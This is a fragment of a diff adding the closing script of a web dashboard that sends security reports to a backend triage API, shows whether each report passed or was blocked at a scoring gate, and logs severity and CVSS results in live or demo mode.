+    const t=await post("/api/triage",{report,tier,mode:state.live?"live":"demo",scan_id:g.scan_id});
+    const r=t.result,demo=t.engine!=="live";
+    if(r.triage===null){state.phase="fail";state.failedAt=1;state.blocked++;
+      logEvent({time:stamp(),tier,severity:"blocked",cvss:null,tech:null,aura:g.posterior,blocked:true,demo,valid:false,result:r,report});
+      $("flowTs").textContent="blocked at AURA gate · "+stamp();renderBlocked(g);renderSession();toast("Blocked at AURA gate · "+(g.vetoes.join(", ")||"below threshold"),"err");}
+    else{const valid=t.record.schema_valid;state.phase=valid?"done":"fail";state.failedAt=3;state.last=r;r.aura_gate=g;
+      state.runs.push({...r,cvss_score:+r.cvss_score||0,tier,demo,valid});
+      logEvent({time:stamp(),tier,severity:r.severity,cvss:(+r.cvss_score||0).toFixed(1),tech:r.attack_technique,aura:g.posterior,blocked:false,demo,valid,result:r,report});
+      const banner=demo?`<div class="banner demo">◆ Backend demo engine (keyword heuristics) — AURA gate passed on a SIMULATED scan${r.live_error?" · live failed: "+esc(r.live_error):""}</div>`:`<div class="banner live">● Live — Nebius Token Factory via backend</div>`;
+      $("flowTs").textContent="completed · "+stamp();$("outTs").textContent=stamp()+(demo?" · demo":" · live");renderOut(r,banner,valid,r.validation_error||"");renderSession();toast(`✓ ${r.severity} · CVSS ${r.cvss_score} · record ${t.record.id}`,"ok");}
+    await loadRecords();
+  }catch(e){console.error(e);toast("Backend error: "+e.message+" — falling back to offline demo","warn");BE.up=false;btn.disabled=false;btn.textContent="▶ Run triage";return offlineRun();}
+  finally{btn.disabled=false;btn.textContent="▶ Run triage";save();}};
+beCheck().then(loadRecords).then(()=>{const k=new URLSearchParams(location.search).get("autorun");if(k&&BE.up){$("simKind").value=k;$("runBtn").click();}});
+</script>
+</body>
+</html>
